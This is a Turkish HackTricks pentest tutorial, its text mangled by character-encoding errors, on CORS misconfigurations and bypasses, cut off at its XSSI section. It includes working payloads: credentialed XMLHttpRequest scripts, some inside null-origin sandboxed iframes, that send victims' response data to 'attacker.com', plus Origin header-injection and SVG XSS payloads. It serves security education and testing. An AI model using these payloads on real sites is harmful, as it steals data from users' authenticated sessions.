# CORS - YanlÄ±ÅŸ YapÄ±landÄ±rmalar & Atlatma

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## CORS Nedir?

Cross-Origin Resource Sharing (CORS) standardÄ±, **sunucularÄ±n varlÄ±klarÄ±na kimin eriÅŸebileceÄŸini** ve **hangi HTTP istek yÃ¶ntemlerinin dÄ±ÅŸ kaynaklardan izin verildiÄŸini** tanÄ±mlamasÄ±nÄ± saÄŸlar.

**AynÄ± kÃ¶ken** politikasÄ±, bir **kaynak talep eden** sunucu ile **kaynaÄŸÄ±** barÄ±ndÄ±ran sunucunun aynÄ± protokolÃ¼ (Ã¶rneÄŸin, `http://`), alan adÄ±nÄ± (Ã¶rneÄŸin, `internal-web.com`) ve **portu** (Ã¶rneÄŸin, 80) paylaÅŸmasÄ±nÄ± zorunlu kÄ±lar. Bu politika altÄ±nda, yalnÄ±zca aynÄ± alan adÄ± ve porttan gelen web sayfalarÄ±nÄ±n kaynaklara eriÅŸmesine izin verilir.

`http://normal-website.com/example/example.html` baÄŸlamÄ±nda aynÄ± kÃ¶ken politikasÄ±nÄ±n uygulanÄ±ÅŸÄ± aÅŸaÄŸÄ±daki gibi gÃ¶sterilmektedir:

| EriÅŸilen URL                              | EriÅŸime izin verildi mi?               |
| ----------------------------------------- | --------------------------------------- |
| `http://normal-website.com/example/`      | Evet: AynÄ± ÅŸema, alan adÄ± ve port      |
| `http://normal-website.com/example2/`     | Evet: AynÄ± ÅŸema, alan adÄ± ve port      |
| `https://normal-website.com/example/`     | HayÄ±r: FarklÄ± ÅŸema ve port             |
| `http://en.normal-website.com/example/`   | HayÄ±r: FarklÄ± alan adÄ±                 |
| `http://www.normal-website.com/example/`  | HayÄ±r: FarklÄ± alan adÄ±                 |
| `http://normal-website.com:8080/example/` | HayÄ±r: FarklÄ± port\*                   |

\*Internet Explorer, aynÄ± kÃ¶ken politikasÄ±nÄ± uygularken port numarasÄ±nÄ± dikkate almaz, bu nedenle bu eriÅŸime izin verir.

### `Access-Control-Allow-Origin` BaÅŸlÄ±ÄŸÄ±

Bu baÅŸlÄ±k, **birden fazla kÃ¶ken** izin verebilir, **`null`** deÄŸeri veya joker karakter **`*`** iÃ§erebilir. Ancak, **hiÃ§bir tarayÄ±cÄ± birden fazla kÃ¶keni desteklemez** ve joker karakter `*` kullanÄ±mÄ± **sÄ±nÄ±rlamalara** tabidir. (Joker karakter yalnÄ±zca tek baÅŸÄ±na kullanÄ±lmalÄ± ve `Access-Control-Allow-Credentials: true` ile birlikte kullanÄ±mÄ± yasaktÄ±r.)

Bu baÅŸlÄ±k, bir web sitesi tarafÄ±ndan baÅŸlatÄ±lan bir Ã§apraz alan kaynak talebine yanÄ±t olarak **bir sunucu tarafÄ±ndan verilir**, tarayÄ±cÄ± otomatik olarak bir `Origin` baÅŸlÄ±ÄŸÄ± ekler.

### `Access-Control-Allow-Credentials` BaÅŸlÄ±ÄŸÄ±

**VarsayÄ±lan olarak**, Ã§apraz kÃ¶ken talepleri, Ã§erezler veya Yetkilendirme baÅŸlÄ±ÄŸÄ± gibi kimlik bilgileri olmadan yapÄ±lÄ±r. Ancak, bir Ã§apraz alan sunucusu, `Access-Control-Allow-Credentials` baÅŸlÄ±ÄŸÄ±nÄ± **`true`** olarak ayarlayarak kimlik bilgileri gÃ¶nderildiÄŸinde yanÄ±tÄ±n okunmasÄ±na izin verebilir.

`true` olarak ayarlandÄ±ÄŸÄ±nda, tarayÄ±cÄ± kimlik bilgilerini (Ã§erezler, yetkilendirme baÅŸlÄ±klarÄ± veya TLS istemci sertifikalarÄ±) iletecektir.
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### CSRF Ã–n UÃ§uÅŸ Ä°steÄŸi

### Ã‡apraz Alan Ä°letiÅŸiminde Ã–n UÃ§uÅŸ Ä°steklerini Anlamak

Belirli koÅŸullar altÄ±nda, Ã¶rneÄŸin **standart dÄ±ÅŸÄ± bir HTTP yÃ¶ntemi** (HEAD, GET, POST dÄ±ÅŸÄ±ndaki herhangi bir ÅŸey) kullanÄ±ldÄ±ÄŸÄ±nda, yeni **baÅŸlÄ±klar** tanÄ±tÄ±ldÄ±ÄŸÄ±nda veya Ã¶zel bir **Content-Type baÅŸlÄ±k deÄŸeri** kullanÄ±ldÄ±ÄŸÄ±nda, bir Ã¶n uÃ§uÅŸ isteÄŸi gerekli olabilir. **`OPTIONS`** yÃ¶ntemini kullanan bu Ã¶n isteÄŸi, sunucuya yaklaÅŸan Ã§apraz alan isteÄŸinin niyetlerini, kullanmayÄ± planladÄ±ÄŸÄ± HTTP yÃ¶ntemleri ve baÅŸlÄ±klar dahil olmak Ã¼zere, bildirmek iÃ§in kullanÄ±lÄ±r.

**Ã‡apraz Alan Kaynak PaylaÅŸÄ±mÄ± (CORS)** protokolÃ¼, istenen Ã§apraz alan iÅŸleminin uygulanabilirliÄŸini belirlemek iÃ§in izin verilen yÃ¶ntemleri, baÅŸlÄ±klarÄ± ve kaynaÄŸÄ±n gÃ¼venilirliÄŸini doÄŸrulamak amacÄ±yla bu Ã¶n uÃ§uÅŸ kontrolÃ¼nÃ¼ zorunlu kÄ±lar. Ã–n uÃ§uÅŸ isteÄŸi gereksinimini ortadan kaldÄ±ran koÅŸullarÄ± detaylÄ± bir ÅŸekilde anlamak iÃ§in [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests) tarafÄ±ndan saÄŸlanan kapsamlÄ± kÄ±lavuza baÅŸvurun.

**Ã–n uÃ§uÅŸ isteÄŸinin yokluÄŸunun, yanÄ±tÄ±n yetkilendirme baÅŸlÄ±klarÄ±nÄ± taÅŸÄ±ma gerekliliÄŸini ortadan kaldÄ±rmadÄ±ÄŸÄ±nÄ±** belirtmek Ã¶nemlidir. Bu baÅŸlÄ±klar olmadan, tarayÄ±cÄ± Ã§apraz alan isteÄŸinden gelen yanÄ±tÄ± iÅŸleme yeteneÄŸini kaybeder.

`PUT` yÃ¶ntemini ve `Special-Request-Header` adlÄ± Ã¶zel bir baÅŸlÄ±ÄŸÄ± kullanmayÄ± amaÃ§layan bir Ã¶n uÃ§uÅŸ isteÄŸinin aÅŸaÄŸÄ±daki Ã¶rneÄŸine bakÄ±n:
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
YanÄ±t olarak, sunucu kabul edilen yÃ¶ntemleri, izin verilen kÃ¶keni ve diÄŸer CORS politika ayrÄ±ntÄ±larÄ±nÄ± belirten baÅŸlÄ±klar dÃ¶ndÃ¼rebilir, aÅŸaÄŸÄ±da gÃ¶sterildiÄŸi gibi:
```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* **`Access-Control-Allow-Headers`**: Bu baÅŸlÄ±k, gerÃ§ek istekte hangi baÅŸlÄ±klarÄ±n kullanÄ±labileceÄŸini belirtir. Sunucu tarafÄ±ndan, istemciden gelen isteklere izin verilen baÅŸlÄ±klarÄ± gÃ¶stermek iÃ§in ayarlanÄ±r.
* **`Access-Control-Expose-Headers`**: Bu baÅŸlÄ±k aracÄ±lÄ±ÄŸÄ±yla sunucu, istemciye basit yanÄ±t baÅŸlÄ±klarÄ±nÄ±n yanÄ± sÄ±ra hangi baÅŸlÄ±klarÄ±n yanÄ±tÄ±n bir parÃ§asÄ± olarak aÃ§Ä±ÄŸa Ã§Ä±karÄ±labileceÄŸini bildirir.
* **`Access-Control-Max-Age`**: Bu baÅŸlÄ±k, bir Ã¶n uÃ§uÅŸ isteÄŸinin sonuÃ§larÄ±nÄ±n ne kadar sÃ¼reyle Ã¶nbelleÄŸe alÄ±nabileceÄŸini gÃ¶sterir. Sunucu, bir Ã¶n uÃ§uÅŸ isteÄŸi tarafÄ±ndan dÃ¶ndÃ¼rÃ¼len bilginin yeniden kullanÄ±labileceÄŸi maksimum sÃ¼reyi, saniye cinsinden ayarlar.
* **`Access-Control-Request-Headers`**: Ã–n uÃ§uÅŸ isteklerinde kullanÄ±lan bu baÅŸlÄ±k, istemci tarafÄ±ndan sunucuya hangi HTTP baÅŸlÄ±klarÄ±nÄ± kullanmak istediÄŸini bildirmek iÃ§in ayarlanÄ±r.
* **`Access-Control-Request-Method`**: Ã–n uÃ§uÅŸ isteklerinde de kullanÄ±lan bu baÅŸlÄ±k, istemci tarafÄ±ndan gerÃ§ek istekte hangi HTTP yÃ¶nteminin kullanÄ±lacaÄŸÄ±nÄ± belirtmek iÃ§in ayarlanÄ±r.
* **`Origin`**: Bu baÅŸlÄ±k, tarayÄ±cÄ± tarafÄ±ndan otomatik olarak ayarlanÄ±r ve Ã§apraz kaynak isteÄŸinin kaynaÄŸÄ±nÄ± gÃ¶sterir. Sunucu, gelen isteÄŸin CORS politikasÄ± temelinde izin verilip verilmeyeceÄŸini deÄŸerlendirmek iÃ§in kullanÄ±r.

Genellikle (iÃ§erik tÃ¼rÃ¼ne ve ayarlanan baÅŸlÄ±klara baÄŸlÄ± olarak) bir **GET/POST isteÄŸinde Ã¶n uÃ§uÅŸ isteÄŸi gÃ¶nderilmez** (istek **doÄŸrudan** gÃ¶nderilir), ancak **yanÄ±tÄ±n baÅŸlÄ±klarÄ±na/gÃ¶vdesine** eriÅŸmek istiyorsanÄ±z, bunu izin veren bir _Access-Control-Allow-Origin_ baÅŸlÄ±ÄŸÄ± iÃ§ermelidir.\
**Bu nedenle, CORS CSRF'ye karÅŸÄ± koruma saÄŸlamaz (ama yardÄ±mcÄ± olabilir).**

### **Yerel AÄŸ Ä°stekleri Ã–n UÃ§uÅŸ Ä°steÄŸi**

1. **`Access-Control-Request-Local-Network`**: Bu baÅŸlÄ±k, istemcinin isteÄŸine dahil edilerek sorgunun yerel aÄŸ kaynaÄŸÄ±na yÃ¶nelik olduÄŸunu belirtir. Sunucuya, isteÄŸin yerel aÄŸdan geldiÄŸini bildiren bir iÅŸaret olarak hizmet eder.
2. **`Access-Control-Allow-Local-Network`**: Sunucular, yanÄ±t olarak bu baÅŸlÄ±ÄŸÄ± kullanarak istenen kaynaÄŸÄ±n yerel aÄŸ dÄ±ÅŸÄ±ndaki varlÄ±klarla paylaÅŸÄ±lmasÄ±na izin verildiÄŸini iletir. FarklÄ± aÄŸ sÄ±nÄ±rlarÄ± arasÄ±nda kaynaklarÄ±n paylaÅŸÄ±mÄ±na yeÅŸil Ä±ÅŸÄ±k yakarak, gÃ¼venlik protokollerini korurken kontrollÃ¼ eriÅŸim saÄŸlar.

Yerel aÄŸ isteÄŸini izin veren **geÃ§erli bir yanÄ±t**, yanÄ±tta `Access-Controls-Allow-Local_network: true` baÅŸlÄ±ÄŸÄ±nÄ± da iÃ§ermelidir:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
Not edin ki linux **0.0.0.0** IP'si, bu IP adresi "yerel" olarak kabul edilmediÄŸi iÃ§in localhost'a eriÅŸim iÃ§in bu gereksinimleri **bypass** etmekte iÅŸe yarar.

AyrÄ±ca, **yerel bir uÃ§ noktanÄ±n** (Ã¶rneÄŸin, yÃ¶nlendiricinin genel IP'si) **genel IP adresini** kullanÄ±rsanÄ±z **Yerel AÄŸ gereksinimlerini bypass etmek** de mÃ¼mkÃ¼ndÃ¼r. Ã‡Ã¼nkÃ¼ birÃ§ok durumda, **genel IP** eriÅŸilse bile, eÄŸer **yerel aÄŸdan** geliyorsa, eriÅŸim saÄŸlanacaktÄ±r.
{% endhint %}

## SÃ¶mÃ¼rÃ¼lebilir yanlÄ±ÅŸ yapÄ±landÄ±rmalar

`Access-Control-Allow-Credentials` ayarÄ±nÄ±n **`true`** olarak ayarlanmasÄ±nÄ±n, Ã§oÄŸu **gerÃ§ek saldÄ±rÄ±** iÃ§in bir Ã¶n koÅŸul olduÄŸu gÃ¶zlemlenmiÅŸtir. Bu ayar, tarayÄ±cÄ±nÄ±n kimlik bilgilerini gÃ¶ndermesine ve yanÄ±tÄ± okumasÄ±na izin vererek saldÄ±rÄ±nÄ±n etkinliÄŸini artÄ±rÄ±r. Bunu olmadan, bir tarayÄ±cÄ±nÄ±n bir istek yapmasÄ±nÄ±n faydasÄ±, bir kullanÄ±cÄ±nÄ±n Ã§erezlerini kullanmanÄ±n imkansÄ±z hale gelmesi nedeniyle azalÄ±r.

### Ä°stisna: AÄŸ Konumunu Kimlik DoÄŸrulama Olarak Kullanma

KurbanÄ±n aÄŸ konumunun bir kimlik doÄŸrulama biÃ§imi olarak iÅŸlev gÃ¶rdÃ¼ÄŸÃ¼ bir istisna vardÄ±r. Bu, kurbanÄ±n tarayÄ±cÄ±sÄ±nÄ±n bir proxy olarak kullanÄ±lmasÄ±na ve intranet uygulamalarÄ±na eriÅŸim iÃ§in IP tabanlÄ± kimlik doÄŸrulamayÄ± aÅŸmasÄ±na olanak tanÄ±r. Bu yÃ¶ntem, DNS rebinding ile benzer etkilere sahiptir ancak sÃ¶mÃ¼rmesi daha basittir.

### `Origin`'in `Access-Control-Allow-Origin`'de YansÄ±masÄ±

`Origin` baÅŸlÄ±ÄŸÄ±nÄ±n deÄŸeri `Access-Control-Allow-Origin`'de yansÄ±tÄ±ldÄ±ÄŸÄ± gerÃ§ek dÃ¼nya senaryosu, bu baÅŸlÄ±klarÄ±n birleÅŸtirilmesine yÃ¶nelik kÄ±sÄ±tlamalar nedeniyle teorik olarak olasÄ± deÄŸildir. Ancak, birden fazla URL iÃ§in CORS'u etkinleÅŸtirmek isteyen geliÅŸtiriciler, `Origin` baÅŸlÄ±ÄŸÄ±nÄ±n deÄŸerini kopyalayarak `Access-Control-Allow-Origin` baÅŸlÄ±ÄŸÄ±nÄ± dinamik olarak oluÅŸturabilirler. Bu yaklaÅŸÄ±m, bir saldÄ±rganÄ±n meÅŸru gÃ¶rÃ¼nmek Ã¼zere tasarlanmÄ±ÅŸ bir isimle bir alan adÄ± kullanmasÄ± durumunda, doÄŸrulama mantÄ±ÄŸÄ±nÄ± yanÄ±ltarak gÃ¼venlik aÃ§Ä±klarÄ± oluÅŸturabilir.
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### `null` KaynaÄŸÄ±nÄ± Kullanma

`null` kaynaÄŸÄ±, yÃ¶nlendirmeler veya yerel HTML dosyalarÄ± gibi durumlar iÃ§in belirtilmiÅŸtir ve benzersiz bir konuma sahiptir. BazÄ± uygulamalar, yerel geliÅŸtirmeyi kolaylaÅŸtÄ±rmak iÃ§in bu kaynaÄŸÄ± beyaz listeye alÄ±r ve bu da istemeden herhangi bir web sitesinin bir sandboxed iframe aracÄ±lÄ±ÄŸÄ±yla `null` kaynaÄŸÄ±nÄ± taklit etmesine izin vererek CORS kÄ±sÄ±tlamalarÄ±nÄ± aÅŸmasÄ±na neden olur.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### Regular Expression Bypass Techniques

Bir alan beyaz listesinin karÅŸÄ±sÄ±na Ã§Ä±ktÄ±ÄŸÄ±nÄ±zda, saldÄ±rganÄ±n alanÄ±nÄ± beyaz listeye alÄ±nmÄ±ÅŸ bir alana eklemek veya alt alan ele geÃ§irme aÃ§Ä±klarÄ±nÄ± istismar etmek gibi geÃ§iÅŸ fÄ±rsatlarÄ±nÄ± test etmek Ã§ok Ã¶nemlidir. AyrÄ±ca, alan doÄŸrulamasÄ± iÃ§in kullanÄ±lan dÃ¼zenli ifadeler, alan adlandÄ±rma kurallarÄ±ndaki incelikleri gÃ¶zden kaÃ§Ä±rabilir ve bu da daha fazla geÃ§iÅŸ fÄ±rsatÄ± sunar.

### Advanced Regular Expression Bypasses

Regex desenleri genellikle alfanÃ¼merik, nokta (.) ve tire (-) karakterlerine odaklanÄ±r, diÄŸer olasÄ±lÄ±klarÄ± gÃ¶z ardÄ± eder. Ã–rneÄŸin, tarayÄ±cÄ±lar ve regex desenleri tarafÄ±ndan farklÄ± yorumlanan karakterleri iÃ§erecek ÅŸekilde oluÅŸturulmuÅŸ bir alan adÄ±, gÃ¼venlik kontrollerini geÃ§ebilir. Safari, Chrome ve Firefox'un alt alanlardaki alt Ã§izgi karakterlerini ele alÄ±ÅŸÄ±, bu tÃ¼r tutarsÄ±zlÄ±klarÄ±n alan doÄŸrulama mantÄ±ÄŸÄ±nÄ± aÅŸmak iÃ§in nasÄ±l istismar edilebileceÄŸini gÃ¶stermektedir.

**Daha fazla bilgi ve bu geÃ§iÅŸ kontrolÃ¼nÃ¼n ayarlarÄ± iÃ§in:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **ve** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![https://miro.medium.com/v2/resize:fit:720/format:webp/1\*rolEK39-DDxeBgSq6KLKAA.png](<../.gitbook/assets/image (284).png>)

### From XSS inside a subdomain

GeliÅŸtiriciler genellikle CORS istismarÄ±na karÅŸÄ± koruma saÄŸlamak iÃ§in, bilgi talep etmeye izin verilen alanlarÄ± beyaz listeye alarak savunma mekanizmalarÄ± uygular. Bu Ã¶nlemlere raÄŸmen, sistemin gÃ¼venliÄŸi kusursuz deÄŸildir. Beyaz listeye alÄ±nmÄ±ÅŸ alanlar iÃ§inde tek bir savunmasÄ±z alt alanÄ±n varlÄ±ÄŸÄ±, XSS (Cross-Site Scripting) gibi diÄŸer aÃ§Ä±klar aracÄ±lÄ±ÄŸÄ±yla CORS istismarÄ±na kapÄ± aÃ§abilir.

Ã–rneÄŸin, `requester.com` adlÄ± bir alanÄ±n, `provider.com` adlÄ± baÅŸka bir alandan kaynaklara eriÅŸmek iÃ§in beyaz listeye alÄ±ndÄ±ÄŸÄ± senaryoyu dÃ¼ÅŸÃ¼nÃ¼n. Sunucu tarafÄ± yapÄ±landÄ±rmasÄ± muhtemelen ÅŸÃ¶yle gÃ¶rÃ¼nebilir:
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com') {
// Access data
} else {
// Unauthorized access
}
```
Bu kurulumda, `requester.com`'un tÃ¼m alt alan adlarÄ±na eriÅŸim izni verilmektedir. Ancak, bir alt alan adÄ±, Ã¶rneÄŸin `sub.requester.com`, bir XSS aÃ§Ä±ÄŸÄ± ile tehlikeye girerse, bir saldÄ±rgan bu zayÄ±flÄ±ktan yararlanabilir. Ã–rneÄŸin, `sub.requester.com`'a eriÅŸimi olan bir saldÄ±rgan, XSS aÃ§Ä±ÄŸÄ±nÄ± kullanarak CORS politikalarÄ±nÄ± atlayabilir ve `provider.com` Ã¼zerindeki kaynaklara kÃ¶tÃ¼ niyetle eriÅŸebilir.

### **Sunucu tarafÄ± Ã¶nbellek zehirlenmesi**

[**Bu araÅŸtÄ±rmadan**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

HTTP baÅŸlÄ±k enjeksiyonu yoluyla sunucu tarafÄ± Ã¶nbellek zehirlenmesini kullanarak, saklanan bir Cross-Site Scripting (XSS) aÃ§Ä±ÄŸÄ±nÄ±n tetiklenmesi mÃ¼mkÃ¼ndÃ¼r. Bu senaryo, bir uygulamanÄ±n `Origin` baÅŸlÄ±ÄŸÄ±nÄ± yasadÄ±ÅŸÄ± karakterler iÃ§in temizlemeyi baÅŸaramadÄ±ÄŸÄ±nda ortaya Ã§Ä±kar ve Ã¶zellikle Internet Explorer ve Edge kullanÄ±cÄ±larÄ± iÃ§in bir zayÄ±flÄ±k oluÅŸturur. Bu tarayÄ±cÄ±lar (0x0d) deÄŸerini meÅŸru bir HTTP baÅŸlÄ±k sonlandÄ±rÄ±cÄ±sÄ± olarak kabul eder, bu da HTTP baÅŸlÄ±k enjeksiyonu zayÄ±flÄ±klarÄ±na yol aÃ§ar.

`Origin` baÅŸlÄ±ÄŸÄ±nÄ±n manipÃ¼le edildiÄŸi aÅŸaÄŸÄ±daki isteÄŸi dÃ¼ÅŸÃ¼nÃ¼n:
```
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```
Internet Explorer ve Edge yanÄ±tÄ± ÅŸu ÅŸekilde yorumlar:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```
Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± doÄŸrudan kÃ¶tÃ¼ye kullanmak iÃ§in bir web tarayÄ±cÄ±sÄ±nÄ±n hatalÄ± bir baÅŸlÄ±k gÃ¶ndermesi pratik deÄŸildir, ancak Burp Suite gibi araÃ§lar kullanÄ±larak Ã¶zel bir istek manuel olarak oluÅŸturulabilir. Bu yÃ¶ntem, sunucu tarafÄ±nda bir Ã¶nbelleÄŸin yanÄ±tÄ± kaydetmesine ve istemeden baÅŸkalarÄ±na sunmasÄ±na yol aÃ§abilir. Ã–zel yÃ¼k, sayfanÄ±n karakter setini UTF-7 olarak deÄŸiÅŸtirmeyi amaÃ§lar; bu, belirli baÄŸlamlarda script olarak Ã§alÄ±ÅŸtÄ±rÄ±labilen karakterleri kodlama yeteneÄŸi nedeniyle genellikle XSS gÃ¼venlik aÃ§Ä±klarÄ± ile iliÅŸkilendirilen bir karakter kodlamasÄ±dÄ±r.

Depolanan XSS gÃ¼venlik aÃ§Ä±klarÄ± hakkÄ±nda daha fazla bilgi iÃ§in [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored) sayfasÄ±na bakÄ±n.

**Not**: HTTP baÅŸlÄ±k enjeksiyon gÃ¼venlik aÃ§Ä±klarÄ±nÄ±n, Ã¶zellikle sunucu tarafÄ± Ã¶nbellek zehirlenmesi yoluyla kÃ¶tÃ¼ye kullanÄ±lmasÄ±, tÃ¼m kullanÄ±cÄ± tarafÄ±ndan saÄŸlanan girdilerin, HTTP baÅŸlÄ±klarÄ± da dahil olmak Ã¼zere, doÄŸrulanmasÄ± ve temizlenmesinin kritik Ã¶nemini vurgular. Bu tÃ¼r gÃ¼venlik aÃ§Ä±klarÄ±nÄ± Ã¶nlemek iÃ§in her zaman giriÅŸ doÄŸrulamasÄ±nÄ± iÃ§eren saÄŸlam bir gÃ¼venlik modeli uygulayÄ±n.

### **Ä°stemci TarafÄ± Ã–nbellek Zehirlenmesi**

[**Bu araÅŸtÄ±rmadan**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

Bu senaryoda, uygun kodlama olmadan Ã¶zel bir HTTP baÅŸlÄ±ÄŸÄ±nÄ±n iÃ§eriÄŸini yansÄ±tan bir web sayfasÄ± Ã¶rneÄŸi gÃ¶zlemlenmektedir. Ã–zellikle, web sayfasÄ± `X-User-id` baÅŸlÄ±ÄŸÄ±nda yer alan iÃ§eriÄŸi geri yansÄ±tÄ±r; bu iÃ§erik kÃ¶tÃ¼ niyetli JavaScript iÃ§erebilir. Ã–rneÄŸin, baÅŸlÄ±kta JavaScript kodunu yÃ¼kleme sÄ±rasÄ±nda Ã§alÄ±ÅŸtÄ±rmak iÃ§in tasarlanmÄ±ÅŸ bir SVG resim etiketi bulunmaktadÄ±r.

Cross-Origin Resource Sharing (CORS) politikalarÄ±, Ã¶zel baÅŸlÄ±klarÄ±n gÃ¶nderilmesine izin verir. Ancak, CORS kÄ±sÄ±tlamalarÄ± nedeniyle yanÄ±t doÄŸrudan tarayÄ±cÄ± tarafÄ±ndan iÅŸlenmediÄŸinde, bÃ¶yle bir enjeksiyonun faydasÄ± sÄ±nÄ±rlÄ± gÃ¶rÃ¼nebilir. Kritik nokta, tarayÄ±cÄ±nÄ±n Ã¶nbellek davranÄ±ÅŸÄ±nÄ± dikkate almaktÄ±r. EÄŸer `Vary: Origin` baÅŸlÄ±ÄŸÄ± belirtilmemiÅŸse, kÃ¶tÃ¼ niyetli yanÄ±tÄ±n tarayÄ±cÄ± tarafÄ±ndan Ã¶nbelleÄŸe alÄ±nmasÄ± mÃ¼mkÃ¼n hale gelir. SonrasÄ±nda, bu Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ yanÄ±t, URL'ye gidildiÄŸinde doÄŸrudan iÅŸlenebilir ve ilk istekte doÄŸrudan iÅŸleme gereksinimini atlayabilir. Bu mekanizma, istemci tarafÄ± Ã¶nbellekleme kullanÄ±larak saldÄ±rÄ±nÄ±n gÃ¼venilirliÄŸini artÄ±rÄ±r.

Bu saldÄ±rÄ±yÄ± gÃ¶stermek iÃ§in, bir web sayfasÄ± ortamÄ±nda Ã§alÄ±ÅŸtÄ±rÄ±lmak Ã¼zere tasarlanmÄ±ÅŸ bir JavaScript Ã¶rneÄŸi saÄŸlanmÄ±ÅŸtÄ±r; Ã¶rneÄŸin bir JSFiddle aracÄ±lÄ±ÄŸÄ±yla. Bu script basit bir iÅŸlem gerÃ§ekleÅŸtirir: kÃ¶tÃ¼ niyetli JavaScript iÃ§eren Ã¶zel bir baÅŸlÄ±kla belirli bir URL'ye istek gÃ¶nderir. Ä°stek baÅŸarÄ±yla tamamlandÄ±ÄŸÄ±nda, hedef URL'ye yÃ¶nelmeye Ã§alÄ±ÅŸÄ±r; eÄŸer yanÄ±t `Vary: Origin` baÅŸlÄ±ÄŸÄ± uygun ÅŸekilde iÅŸlenmeden Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸsa, enjekte edilen scriptin Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ± tetikleyebilir.

Bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±lan JavaScript'in Ã¶zet bir dÃ¶kÃ¼mÃ¼:
```html
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
req.send();
</script>
```
## Bypass

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSI, aynÄ± zamanda Cross-Site Script Inclusion olarak bilinir, script etiketi kullanarak kaynaklarÄ± dahil ederken Same Origin Policy (SOP) uygulanmadÄ±ÄŸÄ± gerÃ§eÄŸinden faydalanan bir tÃ¼r gÃ¼venlik aÃ§Ä±ÄŸÄ±dÄ±r. Bunun nedeni, scriptlerin farklÄ± alan adlarÄ±ndan dahil edilebilmesi gerekliliÄŸidir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±, bir saldÄ±rganÄ±n script etiketi kullanÄ±larak dahil edilen herhangi bir iÃ§eriÄŸe eriÅŸip okumasÄ±na olanak tanÄ±r.

